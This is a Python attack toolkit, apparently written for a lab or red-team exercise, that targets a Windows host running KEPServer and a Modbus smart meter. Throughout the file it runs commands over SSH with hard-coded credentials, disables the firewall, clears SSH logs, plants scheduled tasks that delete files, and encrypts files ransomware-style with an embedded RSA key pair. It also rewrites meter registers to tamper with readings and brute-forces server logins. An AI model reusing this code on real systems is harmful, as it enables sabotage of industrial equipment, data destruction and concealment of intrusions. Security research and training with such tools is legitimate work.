from os import walk, path, remove, scandir, urandom
import base64
from pathlib import Path
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from shutil import copyfile
from subprocess import run, CalledProcessError, PIPE
from time import sleep
import kepconfig
from kepconfig import connection, admin, connectivity, datalogger
import json
import sys
import paramiko
from scp import SCPClient
import socket
import platform
import threading
import argparse
import textwrap

class AttackScript:
    def __init__(self, ip, username="Student", password="Student12345@"):
        #############
        # CONSTANTS #
        #############
        # Default credentials for windows server. 
        self.USERNAME = username
        self.PASSWORD = password
        self.WINDOWS_SERVER_IP = ip

        # Set the path for the password brute force file
        self.PASSWORD_FILE = path.join("resources", "rockyou.txt")

        # Set the path for vulnerable sshd_config file and the access key
        self.SSHD_CONFIG_PATH = path.join("resources", "vuln_sshd_config")
        self.ACCESS_KEY_PATH = path.join("resources", "accessKey.pub")

        # Set the path for the private SSH key
        self.PRIVATE_KEY_PATH = path.join("resources", "accessKey")

        # Set the path for the shared directory
        self.COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"

        # Set the path for the Smart Meter folder
        self.SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"

        # Path for the Modpoll
        # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
        self.MODPOLL_PATH = "C:\\Users\\Student"

        # Path for generating EXE
        self.SCRIPT_NAME = path.basename(__file__)

    ###########
    # ATTACKS #
    ###########

    def ssh_run_command(self, command: str) -> str:
        """
        Runs a SINGLE command through ssh remotely and grab the output.

        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file

        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.

        Args:
            command (str): The command to run on the remote server.
            host (str): The hostname or IP address of the remote server.
            username (str): The username to use for the SSH connection.
            password (str): The password to use for the SSH connection.
            private_key_path (str): The path to the private key file.

        Returns:
            str: The output of the command.
        
        NOTE: The output only allows a maximum of 2^21 characters.
        """

        ssh_output: str = "" # Declare as string to prevent error proning

        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the remote server, prioritizing private key over password
            if self.PRIVATE_KEY_PATH is not None:
                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
                # Connect using the private key
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
            if self.PASSWORD is not None:
                # Connect using password
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
            else:
                # Handle case when neither password nor private key is provided
                print("Please provide either a password or a private key.")
                return None

            # Run the command
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
            ssh_output_list = ssh_stdout.readlines()
            for line_no, line in enumerate(ssh_output_list):
                ssh_output_list[line_no] = line.replace("\r\n", "\n")
            ssh_output = "".join(ssh_output_list)

        except paramiko.AuthenticationException:
            print("Authentication failed. Please check your credentials.")
            return None
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
            return None
        except Exception as e:
            print(f"An error occurred: {e}")
            return None
        ssh.close()
        # Return the output
        return ssh_output

    def scheduled_task_delete_files(self, folder_path, revert=False) -> None:
        """
        # NOTE: This is adapted from the previous team. I don''t even know if the smartmeter path even exists tbh
        
        Delete the smartmeter path periodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
        
        Args:
            folder_path (str): path of folder to be deleted
        """
        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
        # If the thing is ran locally
        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
            for root, dirs, files in walk(folder_path):
                for file in files:
                    og = path.join(root, file)
                    # dest = path.join(self.COPIED_PATH, file)
                    remove(og)
                    print("File: " + str(og) + " is deleted")

        # Remotely transfer the exe and run attack 1, which will then run locally
        else:
            check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")

            if (self.SCRIPT_NAME.rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
                # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
                if platform.system() != "Windows":
                    raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
                
                self.transfer_exe_remotely()

            executable_file_path = f"{self.MODPOLL_PATH}\\{self.SCRIPT_NAME.rsplit('.', 1)[0]}.exe"

            executable_file_parameters = '1'

            task_name1 = 'Smart Meter Testing'
            task_name2 = 'Smart Meter Testing 2'

            if revert:
                # TODO: Delete the exe too, may need error checking?
                print(executable_file_path)
                output_cmd = self.ssh_run_command(f'del {executable_file_path}')
                print(output_cmd)
                                     
                output1 = self.ssh_run_command(f'schtasks /delete /tn "{task_name1}" /f')
                output2 = self.ssh_run_command(f'schtasks /delete /tn "{task_name2}" /f')

                if "SUCCESS:" in output1.split():
                    print(f"{task_name1} successfully deleted")
                    print("Ok.")
                else:
                    print(output1)
                    print(f"{task_name1} failed to delete")
                    print("Fail.")
                
                if "SUCCESS:" in output2.split():
                    print(f"{task_name2} successfully deleted")
                    print("Ok.")
                else:
                    print(output2)
                    print(f"{task_name2} failed to delete")
                    print("Fail.")
                return

            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
            command_output_1 = self.ssh_run_command(sch1)
            command_output_2 = self.ssh_run_command(sch2)
            print(command_output_1)
            print(command_output_2)
            print("\nOk.\n")

    # Copy files from a folder to the shared directory
    def copy_file(self, folder_path):
        try:
            for root, dirs, files in walk(folder_path):
                for file in files:
                    og = path.join(root, file)
                    dest = path.join(self.COPIED_PATH, file)
                    copyfile(og, dest)
                    print("File: " + str(og) + " is copied")
            print("\nOk.\n")
        except Exception:
            print("\nFail.\n")

    def disable_firewall(self, revert: bool=False) -> None:
        """
        Turn off all three domains of the firewall

        Args:
            revert (bool): Enables all three domains of the firewall if True
        """
        able = "Disabled"
        if revert:
            able = "Enabled"
            command_output = self.ssh_run_command("netsh advfirewall set allprofiles state on")
        else:
            command_output = self.ssh_run_command("netsh advfirewall set allprofiles state off")

        if "Ok." in command_output:
            print(f"Firewall {able} successfully\nOk.\n")
        else:
            print(f"Firewall failed to {able}\nFail.\n")

    def disable_ssh(self) -> None:
        """
        Disable SSH from the firewall
        """

        

        count = 0
        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
        else:
            print("Inbound Firewall Failed to be Inserted")

        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
        else:
            print("Inbound Firewall Failed to be Inserted")

        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
        else:
            print("Outbound Firewall Failed to be Inserted")

        command_output = self.ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
        if "Ok." in command_output:
            count += 1
            print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
        else:
            print("Outbound Firewall Failed to be Inserted")

        service_name = "sshd"
        command_output = self.ssh_run_command(f"sc stop {service_name} && wevtutil cl OpenSSH/Operational && wevtutil cl OpenSSH/Admin")
        print("SSH Logs are cleared!")
        if "FAILED" in command_output:
            print(f"FAILED: {command_output}")
        else:
            print(f"sshd service stopped")
            count += 1

        if count > 4:
            print("SSH Disabled successfully.\nOk.\n")
        else:
            print("SSH Failed to Disable.\nFail.\n")

    def run_modinterrupt(self, revert=False) -> None:
        """
        Run modpoll to interrupt COM1 port by disabling KEP Server and then run modpoll indefenitely
        """
        if revert:
            cmd_output = ""
            cmd_output = self.ssh_run_command("taskkill /IM modpoll.exe /F")
            if "SUCCESS: " in cmd_output:
                print("Successfully reverted attack!")
                self.kep_server_start()
                return
            else:
                raise Exception("Either modpoll.exe doesn't exist or there is something wrong!")

        baudrate = self.baudrate_check()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        parameters = ["-1", "-b", baudrate, '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']

        check_modpoll = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")

        def run_modpoll_interrupt_cmd():
            self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")

        if "Polling" in check_modpoll:
            print("Modinterrupt is running \nOk.\n")
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
            try:
                thread = threading.Thread(target=run_modpoll_interrupt_cmd)
                thread.start()
            except CalledProcessError as e:
                print("Error executing the executable file:", e)
        else:
            print("Modinterrupt is not running. \n Fail.\n")

    def disable_COMPort(self, revert: bool=False) -> None:
        """
        Disable a COM port

        Args:
            revert (bool): Revert the attack. If True, enable the COM Port
        """

        self.kep_server_stop()

        checkCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /enum-devices /class Ports')
        dump = checkCOM.split()
        comPort = "" # Initilize to prevent UnboundLocalError
        deviceID = ""
        for i in range(0, len(dump)):
            if dump[i] == "ID:":
                deviceID = dump[i+1]
                if "CRBLx196117" in deviceID:
                    comPort = deviceID
                    print(f"COM Port name: {comPort}")

        enable_or_disable = "/disable-device"
        if revert:
            enable_or_disable = "/enable-device"
        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe {enable_or_disable} "{comPort}"')
        self.kep_server_start()
        if "successfully" in disableCOM:
            print(disableCOM)
        else:
            print(disableCOM)
            raise Exception(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
        
    def Ransom(self, revert: bool=False) -> None:

        full_path_remote = "C:\\Users\\Student\\Documents\\"
        executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"

        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]

        if revert:
            if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
                self.revert_decrypt()
            else:
                decrypt = self.ssh_run_command(full_path_remote + executable_name + " 8 -r")
                print(decrypt)
            return   
        
        # If the thing is ran locally
        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
            self.encrypt_files()
            return

        # Check Linux and Check macOS
        if platform.system() in ["Linux", "Darwin"]:
            print("Not allowed to compile with current platform")
            check_exe = self.ssh_run_command("dir " + full_path_remote + executable_name)
            print(check_exe)
            if executable_name in check_exe:
                print("Previously injected executable exist on remote system, Running ransom encryption")  
                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 8")
                print(run_exe)
            else:
                raise Exception("Invalid Platform")

        # Check Windows
        elif platform.system() == "Windows":
            output = self.transfer_exe_remotely(full_path_remote)
            print(output)
            run_exe = self.ssh_run_command(full_path_remote + executable_name + " 8")
            print(run_exe)

    def revert_decrypt(self) -> None:
        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
    -----END RSA PRIVATE KEY-----'''

        # exclude extensions
        excludeExtension = ['.py', '.pem', '.exe']

        try:
            for item in self.recurseFiles(self.SMARTMETER_PATH, 'decrypt'):
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                self.decrypt(filePath, privatekey)
            print("Decryption Successful.\nOk.\n")
        except Exception as e:
            print("Decryption Failed.\nFail.\n")
            return

    def encrypt_files(self) -> None:
        # public key
        pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
        pubKey = base64.b64decode(pubKey)

        # exclude extensions
        excludeExtension = ['.py', '.pem', '.exe']
        try:
            for item in self.recurseFiles(self.SMARTMETER_PATH, 'encrypt'):
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                self.encrypt(filePath, pubKey)
                print("Encrypted: " + str(filePath))

            print("Encryption Successful.\nOk.\n")
        except Exception as e:
            print("Encryption Failed.\nFail.\n")

    def encrypt(self, dataFile: Path, publicKey: bytes) -> None:
        '''
        <Insert description here>
        NOTE: use EAX mode to allow detection of unauthorized modifications

        Args:
            dataFile (pathlib.Path): path to file to encrypt
            publicKey (bytes): The public key

        Returns:
            None: Encrypted file with extension .L0v3sh3 and remove original file
        '''
        # read data from file
        extension = dataFile.suffix.lower()
        dataFile = str(dataFile)
        with open(dataFile, 'rb') as f:
            data = f.read()

        # convert data to bytes
        data = bytes(data)

        # create public key object
        key = RSA.import_key(publicKey)
        sessionKey = urandom(16)

        # encrypt the session key with the public key
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        # encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        # save the encrypted data to file
        fileName = dataFile.split(extension)[0]
        fileExtension = '.encrypted'
        encryptedFile = fileName + fileExtension
        with open(encryptedFile, 'wb') as f:
            [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
        remove(dataFile)

    def recurseFiles(self, baseDirectory, mode):
        if mode == 'encrypt':
            # Scan a directory and return a list of all files excluding .encrypted files
            for entry in scandir(baseDirectory):
                if entry.is_file() and not entry.name.endswith(".encrypted"):
                    yield entry
                elif entry.is_dir():
                    yield from self.recurseFiles(entry.path)
        elif mode == 'decrypt':
            # Scan a directory and return a list of all files with .encrypted
            for entry in scandir(baseDirectory):
                if entry.is_file() and entry.name.endswith(".encrypted"):
                    yield entry
                elif entry.is_dir():
                    yield from self.recurseFiles(entry.path)
        else:
            raise Exception("Invalid mode")


    def decrypt(self, dataFile: Path, privatekey: bytes) -> None:
        """
        NOTE: use EAX mode to allow detection of unauthorized modifications

        Args:
            dataFile (pathlib.Path): path to file to encrypt
            privatekey (bytes): The private key
        """

        key = RSA.import_key(privatekey)

        # read data from file
        with open(dataFile, 'rb') as f:
            # read the session key
            encryptedSessionKey, nonce, tag, ciphertext = [f.read(x) for x in (key.size_in_bytes(), 16, 16, -1)]
        try:
            # decrypt the session key
            cipher = PKCS1_OAEP.new(key)
            sessionKey = cipher.decrypt(encryptedSessionKey)

            # decrypt the data with the session key
            cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)

            # save the decrypted data to file
            [fileName, fileExtension] = str(dataFile).split('.')
            decryptedFile = fileName + '_decrypted.csv'
            with open(decryptedFile, 'wb') as f:
                f.write(data)

            print('Decrypted file saved to ' + decryptedFile)
        except Exception as e:
            print("File has not been encrypted.")

    # Run modpoll to change register 40201 to 26
    def change_meterID(self, revert: bool=False) -> None:
        """
        Run modpoll to change register 40201 (Which handle the meter ID) to 26
        
        Args:
            revert (bool): Revert the attack. If True, change meter ID to 25
        """
        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
        
        current_meterID = "25"
        meterID_to_change = "26"

        if revert:
            current_meterID = "26"
            meterID_to_change = "25"

        baudrate = self.baudrate_check(current_meterID)

        if baudrate == "0":
            raise Exception("Unable to connect to SmartMeter")
        
        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", current_meterID, "-1", "-r", "201", "COM1", meterID_to_change]

        modpoll_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
        print(modpoll_output)

        self.kep_server_start()
        if "Written" in modpoll_output:
            print(f"Successfully changed meter ID to {meterID_to_change}")
        else:
            raise Exception(f"Unable to change meter ID to {meterID_to_change}")
        

    def clear_energy_reading(self) -> None:
        """
        TL:DR Run modpoll to clear energy reading.
        
        In full, Register 40253 clears the energy reading when writing the value "78" to it. This clears the energy reading found in address 40026
        """

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        baudrate = self.baudrate_check()
        if baudrate == "0":
            raise Exception("Unable to connect to SmartMeter")

        check_energy = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
        clear_energy = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]

        # FIXME: Try except for running the executable is gone
        print(self.ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))
        print(self.ssh_run_command(f"{executable_path} {' '.join(clear_energy)}"))
        print(self.ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))

        print("Energy Reading Cleared.")

        self.kep_server_start()

        print("\nOk.\n")

    def kep_bruteforce(self) -> None:
        """
        Bruteforces the usernames and passwords of the KEP Server.
        """

        self.kep_server_start()

        usernames = ["Admin", "Administrator"]
        passwords = ["michael", "superman", "7777777", "administrator2022", "johnsnow"]
        success = 0

        for username in usernames:
            for password in passwords:
                print("Trying Username: " + username + ", Trying Password: " + password)
            
                try:
                    server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username, pw=password)
                    output = server.get_project_properties()
                    print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
                    with open(path.join("resources", "credentials.csv"), "a") as f:
                        f.write(f"\n{username},{password},kep")
                    success = 1
                    break
                except Exception as e:
                    print(e)
                    continue

        if success == 0:
            print("\nFail.")

    def baudrate_change(self, revert: bool=False) -> None:
        """
        Run modpoll to change baud rate - Register 40206

        Args:
            revert (bool): Revert the attack. If True, change the baudrate back to 9600.
        """

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        # Call baudrate_check to determine current baudrate
        current_baudrate = self.baudrate_check()
        print(f"Current BaudRate:{current_baudrate}", file=sys.stdout)

        # Use current_baudrate value to set the new baudrate value in parameters list
        new_baudrate = None
        identifyBR = None
       
        if current_baudrate == "4800" or revert: # If revert, set new baudrate to 9600
            new_baudrate = "1"
            identifyBR = "9600"
        elif current_baudrate == "9600":
            new_baudrate = "2"
            identifyBR = "19200"
        elif current_baudrate == "19200":
            new_baudrate = "0"
            identifyBR = "4800"
        else:
            raise Exception("Error: Unknown baudrate", file=sys.stdout)

        print(f"Changed Current BaudRate:{current_baudrate} to {identifyBR}", file=sys.stdout)

        parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]

        self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
        self.kep_server_start()

    def baudrate_check(self, meter_id="25") -> str:
        """
        Run modpoll to check the baudrate - Register 40206
        """
        self.kep_server_stop()

        executable_path = self.MODPOLL_PATH + r"\modpoll.exe"

        found_baudrate: str = "0"
        baudrate_list = ["4800", "9600", "19200"]

        for baudrate in baudrate_list:
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", meter_id, "-r", "206", "-1", "COM1"]
            baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
            print(f"Checking baudrate {baudrate}:")

            if "[206]:" in baudrate_output:
                print(f"Baudrate is {baudrate}\n")
                found_baudrate = baudrate
                break
            else:
                print(f"Baudrate is not {baudrate}\n")

        if found_baudrate != "0":
            return found_baudrate
        else:
            print(baudrate_output)
            raise Exception("Unable to connect to smartmeter")

    def smartmeter_get_hardware_info(self):
        executable_path = self.MODPOLL_PATH + "\\modpoll.exe"

        baudrate = self.baudrate_check()
        if baudrate in ["4800", "9600", "19200"]:
            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")

            parameters[9] = "9006"  # DPM33 Address for reading hardwareOutput
            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")

            error_log = ""
            if "[9005]:" in firmwareOutput:
                firmware_index = firmwareOutput.index("[9005]:")
                print(f"Firmware version: {firmwareOutput[firmware_index + 1]}")
            else:
                error_log = "Firmware version cannot be detected"

            if "[9006]:" in hardwareOutput:
                hardware_index = hardwareOutput.index("[9006]:")
                print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
            else:
                error_log += "\nHardware version cannot be detected"
            
            print("\n")
            self.kep_server_start()

            if error_log:
                raise Exception(error_log)

        else:
            self.kep_server_start()
            raise Exception("Unable to connect to the SmartMeter")

        return

    def kep_connect(self, port: int = 57412) -> connection.server:
        global username, password
        print(f"IP is : {self.WINDOWS_SERVER_IP}")
        """
        Connects to the KEPServer.

        NOTE: 172.16.2.77 if at lv 7\n
        NOTE: 172.16.2.223 if at lv 6

        Args:
            host (str): IP Address of the Remote KEPServer
            port (str): Port of the Remote KEPServer

        Returns:
            kepconfig.connection.server: returns an instance of kepconfig.connection.server
        """
        # 172.16.2.77 if at lv 7
        # 172.16.2.223 if at lv 6
        file_lines = list()
        with open(path.join("resources", "credentials.csv")) as f:
            file_lines = f.readlines()
        
        for credentials in file_lines:
            credentials = credentials.strip().split(",")
            if credentials[2] == "kep":
                username, password = credentials[0], credentials[1]



        server = connection.server(host=self.WINDOWS_SERVER_IP, port=port, user=username, pw=password)
        print("Connected to KEP server.")
        return server

    def kep_server_info(self):
        server = self.kep_connect()
        print(json.dumps(server.get_info(), indent=4), file=sys.stdout)

    ## USERS and USER GROUPS

    def kep_get_all_users(self):
        server = self.kep_connect()
        print(json.dumps(admin.users.get_all_users(server), indent=4), file=sys.stdout)

    def kep_enable_user(self, user):
        server = self.kep_connect()
        print(admin.users.enable_user(server, user), file=sys.stdout)

    def kep_disable_user(self, user):
        server = self.kep_connect()
        print(admin.users.disable_user(server, user), file=sys.stdout)

    def kep_get_single_user(self, user):
        server = self.kep_connect()
        print(json.dumps(admin.users.get_user(server, user), indent=4), file=sys.stdout)

    def kep_modify_user(self, user, description, password, groupname): 
        server = self.kep_connect()
        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": description,
                                                          "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
                                                          "libadminsettings.USERMANAGER_USER_PASSWORD": password}, user=user), indent=4))

    def kep_add_user(self, user, groupname, password):  
        server = self.kep_connect()
        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": user,
                                            "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
                                            "libadminsettings.USERMANAGER_USER_PASSWORD": password}))

    def kep_del_user(self, user): 
        server = self.kep_connect()
        print(admin.users.del_user(server, user))

    def kep_add_user_group(self, usergroup):  
        server = self.kep_connect()
        print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": usergroup}))

    def kep_del_user_group(self, usergroup):  
        server = self.kep_connect()
        print(admin.user_groups.del_user_group(server, usergroup))

    def kep_upgrade_user_group(self, usergroup):  
        server = self.kep_connect()
        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP",
                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable",
                                                           "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": True,
                                                           "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
                                                           "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
                                                           "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
                                                           "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
                                                           "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
                                                           "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
                                                           "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
                                                           "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
                                                           "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group=usergroup))

    def kep_downgrade_user_group(self, usergroup):
        server = self.kep_connect()
        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP",
                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": "Disable",
                                                           "libadminsettings.USERMANAGER_GROUP_ENABLED": False,
                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": False,
                                                           "libadminsettings.USERMANAGER_IO_TAG_WRITE": False,
